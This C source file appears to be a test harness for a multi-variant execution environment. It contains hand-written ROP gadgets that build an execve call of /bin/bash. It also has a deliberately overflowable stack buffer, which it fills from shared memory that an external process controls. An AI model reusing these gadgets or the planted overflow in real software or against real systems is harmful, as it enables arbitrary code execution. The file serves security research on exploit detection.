#include <sys/mman.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdio.h>
#include <errno.h>
#include <unistd.h>
#include <string.h>

#include "definitions.h"


struct shm_t* shm_ptr = nullptr;
const char* FILENAME = "/bin/bash";
const char* ENV[] = { "bash" };


void rop_chain()
{
    __asm__
    (
        ".intel_syntax noprefix;"
        "ret;"
        "xor eax, eax;"
        "mov rax, 59;"
        "ret;"
        "mov rdi, rbx;"
        "ret;"
        "mov rsi, rcx;"
        "ret;"
        "mov rdx, 0;"
        "ret;"
        "syscall;"
        "ret;"
        ".att_syntax;"
        :
        : "b" (FILENAME), "c" (ENV)
    );
}

void example()
{
    void* buffer[5] = 
    { 
        (void*)0x1111111122222222,
        (void*)0x3333333344444444,
        (void*)0x5555555566666666,
        (void*)0x7777777722222222,
        (void*)0x9999999911111111
    };
    printf(" > MVEE protected part giving initial pointer to external.\n");
    shm_ptr->chain[0] = (void*)&rop_chain;

    // allow external to set up rop chain
    printf(" > Notifying external.\n");
    if (sem_post(&shm_ptr->sem2) == -1)
    {
        printf(" > MVEE protected part could not post on semaphore 2. - errno: %d\n", errno);
        return;
    }

    // wait for pointer to be altered
    printf(" > Waiting on external.\n");
    if (sem_wait(&shm_ptr->sem1) == -1)
    {
        printf(" > MVEE protected part could not wait on semaphore 1. - errno: %d\n", errno);
        return;
    }

    // launch rop
    printf(" > Copying buffer out of shared memory.\n");
    for (int i = 0; i < shm_ptr->chain_size; i++)
        buffer[i] = shm_ptr->chain[i];
    return;
}

int main ()
{
    // set up shared memory
    // https://man7.org/linux/man-pages/man3/shm_open.3.html
    int shm_fd = shm_open(MVEE_SHM_NAME, O_CREAT | O_RDWR, S_IRUSR | S_IWUSR);
    if (shm_fd == -1)
    {
        printf(" > MVEE protected part could not acquire shared memory fd. - errno: %d\n", errno);
        return errno;
    }

    if (ftruncate(shm_fd, sizeof(struct shm_t)) == -1)
    {
        printf(" > MVEE protected part could not truncate shared memory. - errno: %d\n", errno);
        return errno;
    }

    shm_ptr = (struct shm_t*) mmap(nullptr, sizeof(struct shm_t), PROT_READ | PROT_WRITE, MAP_SHARED, shm_fd, 0);
    if (shm_ptr == MAP_FAILED)
    {
        printf(" > MVEE protected part could not mmap shared memory. - errno: %d\n", errno);
        return errno;
    }
    memset(&shm_ptr->chain, 0, MVEE_CHAIN_SIZE * sizeof(void*));
    shm_ptr->chain_size = 5;
    if (sem_init(&shm_ptr->sem1, 1, 0) == -1)
    {
        printf(" > MVEE protected part could not set up semaphore 1. - errno: %d\n", errno);
        return errno;
    }
    if (sem_init(&shm_ptr->sem2, 1, 0) == -1)
    {
        printf(" > MVEE protected part could not set up semaphore 2. - errno: %d\n", errno);
        return errno;
    }

    example();

    // clean up shared memory
    shm_unlink(MVEE_SHM_NAME);
    munmap(shm_ptr, sizeof(struct shm_t));

    printf(" > MVEE protected part finished. \n");
    return 0;
}